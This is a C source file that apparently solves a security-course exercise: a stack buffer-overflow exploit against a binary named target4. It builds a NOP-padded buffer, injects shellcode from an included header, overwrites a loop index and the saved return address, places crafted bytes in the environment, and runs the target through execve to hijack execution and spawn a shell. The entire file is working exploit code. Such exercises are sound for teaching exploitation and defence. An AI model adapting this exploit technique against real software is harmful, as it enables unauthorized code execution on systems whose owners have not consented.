#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define SIZE 192
#define RA_OFFSET (SIZE-8)
#define SHELL_OFFSET 120
#define i_OFFSET 168
#define LEN_OFFSET 172

int main(void)
{
  char *args[3];

  args[0] = TARGET; args[2] = NULL;

  char str[SIZE];

	// Insert NOPs
	memset(str, 0x90, SIZE);

	// Insert shellcode
	for (int i = 0; i < strlen(shellcode); i++)
		str[i + SHELL_OFFSET] = shellcode[i];

  // Decrease i
	*(int*) &str[i_OFFSET] = 0x90;

	// Input return address
	*(long*) &str[RA_OFFSET] = 0x3021fdf0;

  args[1] = str;

  char *env[] = {
    "","",
    "\xc0\x00","","",
    "dumydumy\xf0\xfd\x21\x30", "","","",
    NULL
  };

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
